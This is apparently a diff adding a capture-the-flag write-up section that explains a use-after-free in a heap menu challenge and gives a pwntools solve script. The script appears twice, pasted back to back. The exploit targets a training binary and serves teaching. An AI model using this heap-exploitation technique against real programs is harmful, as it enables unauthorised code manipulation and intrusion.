@@ -140,3 +140,107 @@ Another menu type challenge.
 ```
 
 </details>
+
+There is a Use-After-Free (UAF) vulnerability in option 3 when deleting an order. After freeing the chunk, the order variable is not set to NULL so the pointer to the freed chunk is still able to be used. Another thing to keep in mind is that malloc(0x8) and malloc(0x10) will return the same sized chunk because the minimum size for a heap chunk is 0x10 bytes (excluding metadata). Hence, the steps of our attack will be as follows
+
+- Create an order chunk
+- Delete that order chunk
+- Allocate the name chunk, the contents of this chunk will reflect your order chunk. Hence, just make the price of the flag to become $1
+- Profit
+
+<details>
+<summary>Solve Script</summary>
+
+```py
+#!/usr/bin/python
+from pwn import *
+import warnings
+import time
+
+warnings.filterwarnings("ignore",category=BytesWarning)
+
+exe = context.binary = ELF('./flag_service')
+libc = exe.libc
+
+host = "flag-service.warzone-challenges.com"
+port = 1339
+
+gdb_script = '''
+
+'''
+
+r = lambda x: p.recv(x)
+rl = lambda: p.recvline(keepends=False)
+ru = lambda x: p.recvuntil(x, drop=True)
+cl = lambda: p.clean(timeout=1)
+s = lambda x: p.send(x)
+sa = lambda x, y: p.sendafter(x, y)
+sl = lambda x: p.sendline(x)
+sla = lambda x, y: p.sendlineafter(x, y)
+ia = lambda: p.interactive()
+li = lambda s: log.info(s)
+ls = lambda s: log.success(s)
+
+def debug():
+  gdb.attach(p)
+  p.interactive()
+
+p = exe.process()
+# p = remote(host,port)
+#p = gdb.debug('./', gdbscript = gdb_script)
+
+sla(b"exit\n", "2")
+sl("1")
+sla(b"exit\n", "3")
+sla(b"exit\n", "1")
+sl(p32(1) + p32(1))
+sla(b"exit\n", "4")
+
+p.interactive()#!/usr/bin/python
+from pwn import *
+import warnings
+import time
+
+warnings.filterwarnings("ignore",category=BytesWarning)
+
+exe = context.binary = ELF('./flag_service')
+libc = exe.libc
+
+host = "flag-service.warzone-challenges.com"
+port = 1339
+
+gdb_script = '''
+
+'''
+
+r = lambda x: p.recv(x)
+rl = lambda: p.recvline(keepends=False)
+ru = lambda x: p.recvuntil(x, drop=True)
+cl = lambda: p.clean(timeout=1)
+s = lambda x: p.send(x)
+sa = lambda x, y: p.sendafter(x, y)
+sl = lambda x: p.sendline(x)
+sla = lambda x, y: p.sendlineafter(x, y)
+ia = lambda: p.interactive()
+li = lambda s: log.info(s)
+ls = lambda s: log.success(s)
+
+def debug():
+  gdb.attach(p)
+  p.interactive()
+
+p = exe.process()
+# p = remote(host,port)
+#p = gdb.debug('./', gdbscript = gdb_script)
+
+sla(b"exit\n", "2")
+sl("1")
+sla(b"exit\n", "3")
+sla(b"exit\n", "1")
+sl(p32(1) + p32(1))
+sla(b"exit\n", "4")
+
+p.interactive()
+```
+
+</details>
